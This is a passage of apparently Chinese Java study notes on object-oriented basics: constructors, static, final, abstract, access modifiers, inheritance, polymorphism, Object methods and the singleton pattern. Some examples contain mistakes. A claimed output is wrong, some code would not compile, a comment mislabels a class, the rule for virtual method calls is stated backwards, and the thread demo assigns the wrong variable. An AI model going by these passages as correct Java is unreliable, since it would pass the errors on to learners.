class="number">30</span>;</span><br><span class="line">        student.eat();</span><br><span class="line">        student.id=<span class="string">&quot;123&quot;</span>;</span><br><span class="line">        System.out.println(<span class="string">&quot;weight=&quot;</span>+student.weight);</span><br><span class="line">        student.show();</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">输出</span></span><br><span class="line"><span class="comment">weight=30.5</span></span><br><span class="line"><span class="comment">id=123</span></span><br><span class="line"><span class="comment">id=123</span></span><br><span class="line"><span class="comment">fid=223</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>问题1：<br>以下代码的输出是：<br>1.B-A-AB 执行顺序 <em>cB</em>-&gt;(<em>aA</em>:b中先调a)<em>bAB</em><br>2.A-B-A-AB 执行顺序 (<em>aA</em>:子类构造器默认调用父类无参构造器)<em>dB</em>-&gt;(<em>aA</em>:b中先调a)<em>bAB</em></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">A</span>&#123;</span><br><span class="line">    <span class="comment">//a</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">A</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;A&quot;</span>);</span><br><span class="line">    &#125; </span><br><span class="line">    <span class="comment">//b</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">A</span><span class="params">(B)</span>&#123;</span><br><span class="line">        <span class="built_in">this</span>();</span><br><span class="line">        System.out.println(<span class="string">&quot;AB&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//1.</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">B</span>&#123;</span><br><span class="line">    <span class="comment">//c</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">B</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;B&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//2.</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">B</span> <span class="keyword">extends</span> <span class="title class_">A</span> &#123;</span><br><span class="line">    <span class="comment">//d</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">B</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;B&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">C</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">A</span>(<span class="keyword">new</span> <span class="title class_">B</span>());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>问题2：<br>以下代码的输出是:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">F</span>&#123;</span><br><span class="line">    <span class="comment">//a</span></span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> <span class="variable">info</span> <span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setInfo</span><span class="params">(<span class="type">int</span> info)</span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.info = info;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getInfo</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> info;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">S</span> <span class="keyword">extends</span> <span class="title class_">F</span>&#123;</span><br><span class="line">     <span class="keyword">private</span> <span class="type">int</span> <span class="variable">info</span> <span class="operator">=</span> <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">test</span><span class="params">()</span>&#123;</span><br><span class="line">       System.out.println(<span class="built_in">this</span>.getInfo());</span><br><span class="line">       System.out.println(<span class="built_in">super</span>.getInfo());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">            <span class="type">F</span> <span class="variable">f</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">F</span>();</span><br><span class="line">            <span class="type">S</span> <span class="variable">s</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">s</span>();</span><br><span class="line">            System.out.println(f.getInfo());<span class="comment">//1</span></span><br><span class="line">            System.out.println(s.getInfo());</span><br><span class="line">            <span class="comment">//1  子类没有自己的setInfo，实际调用父类的，根据就近原则，也就是父类的info</span></span><br><span class="line">            s.test()<span class="comment">//1 1同理</span></span><br><span class="line"></span><br><span class="line">            s.setInfo(<span class="number">3</span>)<span class="comment">//同理，设置的还是父类的info</span></span><br><span class="line">            System.out.println(f.getInfo());<span class="comment">//3</span></span><br><span class="line">            System.out.println(s.getInfo());<span class="comment">//3</span></span><br><span class="line">            s.test()<span class="comment">//3 3</span></span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="关键字-instanceof"><a href="#关键字-instanceof" class="headerlink" title="关键字 instanceof"></a>关键字 instanceof</h4><p>用于在运行时检查对象是否是一个特定类型（class）的实例，或者是否实现了某个接口（interface）<br>a instanceof b，返回值为true或false;<br>假如a是b的子类，则也返回true!</p>
<h4 id="关键字-static-静态的"><a href="#关键字-static-静态的" class="headerlink" title="关键字 static 静态的"></a>关键字 static 静态的</h4><p>无论是否产生，产生多少对象，特定数据在<em>内存中只有一份</em><br>static用于声明类成员（字段、方法、代码块、内部类等）属于类本身，而不是类的某个特定实例。这意味着无论创建了多少个类的对象，static成员都只有一份拷贝，并且这个拷贝被所有对象共享。被static修饰的被称为静态变量（类变量）。<br>Java中的静态变量值是可以更改的</p>
<p>使用时机：</p>
<ol>
<li>开发中常将一些常量声明为静态的</li>
<li>常量的get&#x2F;set方法也应该是静态的</li>
<li>常将工具类中的方法声明为静态，如Array中的方法</li>
<li>多个实例共享且值相同的变量，可以设为静态变量</li>
</ol>
<h4 id="关键字-final-最终的"><a href="#关键字-final-最终的" class="headerlink" title="关键字 final 最终的"></a>关键字 final 最终的</h4><p>final可以修饰的结构：类，方法，变量</p>
<ol>
<li>修饰类，表示此类不能被继承 -&gt; 不能被拓展的类应当声明为final</li>
<li>修饰方法，表示此方法不能被重写 </li>
<li>修饰变量(成员变量、局部变量)，表示常量，仅可赋值一次，此后不可更改。<ul>
<li>修饰成员变量：每个对象仍拥有独立的一份，对象创建的同时必须初始化完成</li>
<li>修饰成员变量的赋值时机：显示初始化、代码块初始化，构造器初始化</li>
<li>修饰局部变量的赋值时机：方法内声明的，调用前必须赋值且不可再更改；方法形参，调用方法时赋值且方法内不可更改。</li>
</ul>
</li>
</ol>
<h4 id="关键字-abstract-抽象的"><a href="#关键字-abstract-抽象的" class="headerlink" title="关键字 abstract 抽象的"></a>关键字 abstract 抽象的</h4><p>随着继承层次中一个个新子类的定义，类变得越来越抽象，而父类则更一般更通用，导致其越来越抽象有助于没有具体的实例，这种类就是抽象类。例如针对集合图像，圆形，矩形，三角形，都可以求面积和周长，这些共同特征可以抽取为一个共同父类，但这个父类中又无法具体实现计算的方法，而是应该交给各个子类实现，那么父类在声明方法时就只有方法签名而没有方法体，这种没有方法体的方法也称为抽象方法，<em>包含抽象方法的类必须是抽象类</em><br>&#x3D;&#x3D;》abstract修饰的类无法实例化，修饰的方法不能有方法体(包含{})<br>&#x3D;&#x3D;》抽象类的子类必须重写抽象类中的抽象方法才能实例化，否则此子类仍是抽象类。<br>&#x3D;&#x3D;》抽象类内可以没有抽象方法，但抽象方法必须在抽象类内<br>&#x3D;&#x3D;》抽象类仍包含构造器，因为子类的构造器会直接或间接调用父类构造器<br>&#x3D;&#x3D;》抽象方法的功能时确定的，但具体实现是不确定的。</p>
<p>abstract不能修饰属性，构造器和代码块<br>abstract不能修饰私有方法，静态方法，final方法，final类</p>
<blockquote>
<p>私有方法不能重写<br>避免静态方法通过类直接调用<br>final方法不能重写<br>final类不能继承</p>
</blockquote>
<p>示例用法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">class</span> <span class="title class_">AbstractPerson</span> &#123;</span><br><span class="line">    <span class="type">int</span> age;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">void</span> <span class="title function_">eat</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//抽象类应该以Base或Abstract作为类名开头</span></span><br><span class="line"><span class="comment">//抽象方法不能有&#123;&#125;；</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>


<h3 id="面向对象的三大特征"><a href="#面向对象的三大特征" class="headerlink" title="面向对象的三大特征"></a>面向对象的三大特征</h3><p>面向对象开发的原则—-高内聚，低耦合<br>高内聚：类的内部数据操作自己完成，不允许外部干涉<br>低耦合：仅暴露少量方法给外部使用，尽量方便外部调用</p>
<h4 id="封装"><a href="#封装" class="headerlink" title="封装"></a>封装</h4><p>Java通过规定四种权限符private、缺省、protected、public，使用这4种权限修饰符修饰类和类内成员：private &lt; 缺省 &lt; protected &lt; public。当这些成员被调用时，体现可见性的大小<br>修饰符访问范围如下</p>
<table>
<thead>
<tr>
<th>修饰符</th>
<th>本类内部</th>
<th>本包内</th>
<th>其他包的子类(继承)</th>
<th>其他包非子类</th>
</tr>
</thead>
<tbody><tr>
<td>private</td>
<td>YES</td>
<td>NO</td>
<td>NO</td>
<td>NO</td>
</tr>
<tr>
<td>缺省</td>
<td>YES</td>
<td>YES</td>
<td>NO</td>
<td>NO</td>
</tr>
<tr>
<td>protected</td>
<td>YES</td>
<td>YES</td>
<td>YES</td>
<td>NO</td>
</tr>
<tr>
<td>public</td>
<td>YES</td>
<td>YES</td>
<td>YES</td>
<td>YES</td>
</tr>
</tbody></table>
<p>注意：</p>
<ol>
<li>类(除内部类外)只能使用public和缺省修饰</li>
<li>类内成员(属性、方法)四种都可以使用</li>
</ol>
<p>使用示例：</p>
<blockquote>
<p>属性设置为private，对外暴露(public)get和set方法来获取和设置属性，实现过滤等<br>单例模式中的构造器设置为private避免在类的外部建立实例<br>类内需要的方法设置为private</p>
</blockquote>
<p><strong>set和get</strong>方法生成快捷键：fn+alt+insert</p>
<h4 id="继承"><a href="#继承" class="headerlink" title="继承"></a>继承</h4><p>作用：</p>
<ol>
<li>减少代码冗余，提高代码复用性</li>
<li>利于功能拓展</li>
<li>为多态提供了前提</li>
</ol>
<p>相关概念：<br>superClass:父类，超类，基类<br>subClass:子类，派生类<br>默认父类:Object(可以通过方法getClass和getSuperClass来获取)</p>
<p>声明方法：<br>类名后添加extends 父类名<br>父类一定要有一个空参构造器：子类构造器默认调用父类无参构造器<br>示例：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//在Person.java文件中</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Person</span> &#123;</span><br><span class="line">    String name;</span><br><span class="line">    <span class="type">char</span> gender;</span><br><span class="line">    <span class="type">int</span> age;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">grow</span><span class="params">()</span>&#123;</span><br><span class="line">        age++;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//在Student.java文件中</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Student</span> <span class="keyword">extends</span> <span class="title class_">Person</span>&#123;</span><br><span class="line">    String school;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>注意：</p>
<ol>
<li>继承后子类可以<em>获取</em>父类的所有属性和方法</li>
<li>但由于封装性的影响，<em>无法使用</em>private声明的属性和方法</li>
<li>不要滥用继承，必须真有归属的关系才用</li>
</ol>
<p>补充说明：</p>
<ol>
<li>一个父类可以有多个子类，一个子类只能有一个父类（单继承性-针对类的继承，接口继承可以多个）</li>
<li>允许多层继承，父类(直接父类)可有父类(间接父类)</li>
</ol>
<p><em>创建子类的过程中必然会调用父类的构造器</em>！！！<br><img src="https://raw.githubusercontent.com/Fushiye/Alldocuments/main/img_blog/20240705153901.png" alt="子类对象实例化的过程"></p>
<h4 id="多态"><a href="#多态" class="headerlink" title="多态"></a>多态</h4><p>Java中多态性的体现:<br>父类的引用指向子类的对象(或说子类的对象赋给父类的引用) 如：<code>Person p2 = new Man()</code>，其中Man是Person的子类<br>主要还是用于形参父类实参子类的方法值传递场景。</p>
<p>多态性的应用：</p>
<ol>
<li>虚拟方法调用<br>编译时认为调用的方法是左边声明的父类的类型的方法(即被重写的方法)<br>执行时实际执行子类重写父类的方法<br>&#x3D;&#x3D;&gt;编译看右，运行看左</li>
<li>属性仍是按照声明的变量类型，指向父类的属性。属性没有多态性</li>
</ol>
<p>多态的使用前提：</p>
<ol>
<li>类的继承关系</li>
<li>要有方法的重写</li>
</ol>
<p>多态的好处和弊端</p>
<ol>
<li>+精简代码，避免了大量重载方法</li>
<li>+使用父类作为方法的形参，即使增加子类，也无需改变方法，提高拓展性，符合开闭原则。、</li>
<li>-创建了子类的对象，也加载了子类特有的属性和方法，但由于声明的是父类，不能再直接使用子类的特有属性和方法&#x3D;&#x3D;&gt;解决方法：向下转型</li>
</ol>
<p>开闭原则：对扩展开放，对修改关闭。</p>
<p>应用示例:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">AnimalTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">AnimalTest</span> <span class="variable">test</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">AnimalTest</span>();</span><br><span class="line">        test.adopt(<span class="keyword">new</span> <span class="title class_">Dog</span>());</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//通过多态避免了重载adopt方法，将new的Dog子类赋给了声明的父类Animal变量animal</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">adopt</span><span class="params">(Animal animal)</span> &#123;</span><br><span class="line">        animal.eat();</span><br><span class="line">        <span class="comment">//这里只能调用父类Animal的方法</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 不再需要以下语句</span></span><br><span class="line">    <span class="comment">// public void adopt(Dog dog) &#123;</span></span><br><span class="line">    <span class="comment">//     dog.eat();</span></span><br><span class="line">    <span class="comment">// &#125;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Animal</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">eat</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;动物进食&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Cat</span> <span class="keyword">extends</span> <span class="title class_">Animal</span>&#123;</span><br><span class="line">    <span class="meta">@Override</span> <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">eat</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;狗吃肉&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Dog</span> <span class="keyword">extends</span> <span class="title class_">Animal</span>&#123;</span><br><span class="line">    <span class="meta">@Override</span> <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">eat</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;狗吃肉&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>其他示例：如银行开户，信用卡和储蓄卡，都可以是账户，创建方法一样。</p>
<h5 id="向下转型"><a href="#向下转型" class="headerlink" title="向下转型"></a>向下转型</h5><p>多态下声明为父类创建为子类的对象，想要使用子类特有的属性和方法，必须使用向下转型；<br>可能会出现类型转换异常：创建的某个类型子类对象转为另一个类型子类<br>因此建议使用关键字instanceof转换,a instanceof b 假如a是b的子类，则也返回true!</p>
<p>示例：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Person</span> <span class="variable">p2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Man</span>();</span><br><span class="line"><span class="type">Man</span> <span class="variable">m2</span> <span class="operator">=</span> (Man)p2; <span class="comment">//强制转换</span></span><br><span class="line"><span class="comment">//向下转型，之后可以通过m2.调用子类Man的特有属性方法</span></span><br><span class="line"><span class="comment">//m2和p2指向同一堆内存空间</span></span><br><span class="line"><span class="comment">//Woman m2 = (Woman)p2;会报错，因为不是同一类。</span></span><br><span class="line"><span class="keyword">if</span>(p2 <span class="keyword">instanceof</span> Man)&#123;</span><br><span class="line">    <span class="type">Man</span> <span class="variable">m3</span> <span class="operator">=</span> (Man)p2;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//针对上述例子，若watchDoor为Dog类特有属性：</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">adopt</span><span class="params">(Animal animal)</span> &#123;</span><br><span class="line">        animal.eat();</span><br><span class="line">        <span class="keyword">if</span>(animal <span class="keyword">instanceof</span> Dog)&#123;</span><br><span class="line">            <span class="type">Dog</span> <span class="variable">dog</span> <span class="operator">=</span> (Dog) animal;</span><br><span class="line">            dog.watchDoor();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//jdk&gt;=14后上述if语句可以换成</span></span><br><span class="line">        <span class="keyword">if</span>(animal <span class="keyword">instanceof</span> Dog dog)&#123;</span><br><span class="line">            dog.watchDoor();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h3 id="object-默认父类"><a href="#object-默认父类" class="headerlink" title="object 默认父类"></a>object 默认父类</h3><p>说明:指的是java.lang.Object</p>
<ol>
<li>任何一个Java类(除object自己)都直接或间接地继承于object类（java类的根父类,类继承树的根节点）</li>
<li>其中声明的方法具有通用性，没有声明的属性，提供一个空参构造器</li>
</ol>
<p>其中的重要方法：</p>
<h4 id="equals"><a href="#equals" class="headerlink" title="equals()"></a>equals()</h4><p>自定义类没有重写object类中此方法的情况下，调用的作用是比对调用者和被比对对象的地址空间是否相同<br>如a.equals(b),则对比的是a,b二者指向的堆中对象起始空间是否相同。</p>
<p>在String,File,Date和包装类等中，都重写了equals()方法，用于实现各自功能</p>
<p>重写方法：或Fn+Alt+Insert自动生成<br>或按以下模板</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Override</span> <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">equals</span><span class="params">(Object obj)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">this</span> == obj)&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;<span class="comment">//快速判断</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(obj <span class="keyword">instanceof</span> User)&#123;</span><br><span class="line">        <span class="comment">//User即自定义类</span></span><br><span class="line">        <span class="type">User</span> <span class="variable">user</span> <span class="operator">=</span> (User)obj;</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">this</span>.age==user.age)&#123;&#125;<span class="comment">//自定义的相等条件</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>$$重要 区分 &#x3D;&#x3D; 和equals()<br>&#x3D;&#x3D;，运算符<br>使用范围：基本数据类型（判断数值(数据均转为int型，字符转为unicode)是否相等）、引用数据类型(比较两个引用变量的地址值是否相等)<br>equals(),方法<br>适用范围：只能使用在引用数据类型，重写前比较指向的堆地址</p>
<h4 id="toString-NaN"><a href="#toString-NaN" class="headerlink" title="toString()"></a>toString()</h4><p>功能：</p>
<ul>
<li>默认情况下，toString() 方法返回的字符串表示通常包含类名后跟一个 “@” 符号和对象的哈希码的无符号十六进制表示。(即类名(包含所在包和模块)@地址值)</li>
<li>在String,File,Date和包装类等中，都重写了toString()方法，用于返回当前对象实体的内容，使用控制台输出时默认调用</li>
<li>自定义类下可以重写此方法。使用IDEA自动生成Fn+Alt+Insert或按如下模板 <figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Override</span> <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;类名&#123;&quot;</span> +</span><br><span class="line">            <span class="string">&quot;属性名=&quot;</span> + 属性名 +</span><br><span class="line">            <span class="string">&quot;, 属性名=&quot;</span> + 属性名 + <span class="string">&#x27;&#125;&#x27;</span>;</span><br><span class="line">&#125;<span class="comment">//实际可用自由定义返回值格式</span></span><br></pre></td></tr></table></figure></li>
</ul>
<h4 id="clone"><a href="#clone" class="headerlink" title="clone()"></a>clone()</h4><p>对类：复制了一个新的对象，与原对象拥有相同的属性值和方法，但不是简单的地址复制，而是新开辟对空间并复制</p>
<h4 id="finalize"><a href="#finalize" class="headerlink" title="finalize()"></a>finalize()</h4><p>(&lt;&#x3D;jdk8可用，过时方法)<br>为了给对象在被垃圾收集器销毁之前提供一个清理资源的机会。当一个对象被判定为垃圾（即不再有任何引用指向它，成为垃圾收集的目标）时，垃圾收集器在执行垃圾收集之前会调用该对象的 finalize() 方法（如果该方法被覆盖）。<br>&#x3D;&#x3D;&gt;可能由于内部出现循环利用，导致无法正常回收</p>
<h3 id="设计模式"><a href="#设计模式" class="headerlink" title="设计模式"></a>设计模式</h3><p>23种</p>
<h4 id="单例设计模式"><a href="#单例设计模式" class="headerlink" title="单例设计模式"></a>单例设计模式</h4><p>单例设计模式（Singleton Pattern）是一种常用的软件设计模式，它的目的是确保一个类仅有一个实例，并提供一个全局访问点来获取该实例。这种模式在需要控制资源访问（如配置文件读取、数据库连接等）时非常有用，因为它可以确保所有访问都是通过同一个实例来进行的，从而避免了由于多个实例操作导致的资源冲突和数据不一致问题。《设计模式》</p>
<p>设计方法</p>
<ol>
<li>必须将类的构造器的访问权限设置为private &#x3D;&#x3D;&gt;无法在类外使用new来产生对象</li>
<li>类外无法通过对象调用，因此只能设计所有方法为静态方法 &#x3D;&#x3D;&gt; 静态方法无法使用成员变量</li>
<li>所有变量都必须是静态变量</li>
</ol>
<p>代码撰写方法：<br>方式1：饿汉式</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">BankTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">        <span class="type">Bank</span> <span class="variable">bank1</span> <span class="operator">=</span> Bank.getInstance();</span><br><span class="line">        <span class="type">Bank</span> <span class="variable">bank2</span> <span class="operator">=</span> Bank.getInstance();</span><br><span class="line">        System.out.println(bank2 == bank1);</span><br><span class="line">        <span class="comment">//实际二者指向同一地址空间</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Bank</span>&#123;</span><br><span class="line">    <span class="comment">//1. 类的构造器私有化</span></span><br><span class="line">    <span class="keyword">private</span> <span class="title function_">Bank</span><span class="params">()</span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 2. 在类的内部创建当前类的实例</span></span><br><span class="line">    <span class="comment">// 4. 此属性也必须声明为static</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">Bank</span> <span class="variable">instance</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Bank</span>();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 3.使用get方法获取当前类的实例，必须声明为static</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Bank <span class="title function_">getInstance</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> instance;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>方式2: 懒汉式</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">BankTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">        <span class="type">Bank</span> <span class="variable">bank1</span> <span class="operator">=</span> Bank.getInstance();</span><br><span class="line">        <span class="type">Bank</span> <span class="variable">bank2</span> <span class="operator">=</span> Bank.getInstance();</span><br><span class="line">        System.out.println(bank2 == bank1);</span><br><span class="line">        <span class="comment">//实际二者指向同一地址空间</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Bank</span>&#123;</span><br><span class="line">    <span class="comment">//1. 类的构造器私有化</span></span><br><span class="line">    <span class="keyword">private</span> <span class="title function_">Bank</span><span class="params">()</span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 2. 在类的内部声明当前类的实例</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">Bank</span> <span class="variable">instance</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 3.使用get方法获取当前类的实例，如果未创建，在方法内进行创建，必须声明为static</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Bank <span class="title function_">getInstance</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(instance == <span class="literal">null</span>)&#123;</span><br><span class="line">            instance = <span class="keyword">new</span> <span class="title class_">Bank</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> instance;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>两种方式对比：<br>懒汉式内存较好，”延迟加载”，使用才创建，线程不安全，（一个在判断一个在new可能new多个）<br>饿汉式写法简单，使用速度较快，”立即加载”，已经加载直接使用，<em>线程安全</em>，内存占用时间较长，<em>推荐方法</em></p>
<h5 id="线程安全的懒汉式"><a href="#线程安全的懒汉式" class="headerlink" title="线程安全的懒汉式"></a>线程安全的懒汉式</h5><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">BankTest</span> &#123;</span><br><span class="line">    <span class="keyword">static</span> <span class="type">Bank</span> <span class="variable">b1</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">static</span> <span class="type">Bank</span> <span class="variable">b2</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">        <span class="type">Thread</span> <span class="variable">t1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Thread</span>()&#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span>&#123;</span><br><span class="line">                b1 = Bank.getInstance();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">Thread</span> <span class="variable">t2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Thread</span>()&#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span>&#123;</span><br><span class="line">                b1 = Bank.getInstance();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        t1.start();t2.start();</span><br><span class="line">        System.out.println(b1 == b2)</span><br><span class="line">        <span class="comment">//实际二者指向同一地址空间</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Bank</span>&#123;</span><br><span class="line">    <span class="comment">//1. 类的构造器私有化</span></span><br><span class="line">    <span class="keyword">private</span> <span class="title function_">Bank</span><span class="params">()</span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 2. 在类的内部声明当前类的实例</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">Bank</span> <span class="variable">instance</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 3.使用get方法获取当前类的实例，如果未创建，在方法内进行创建，必须声明为static</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 方式1</span></span><br><span 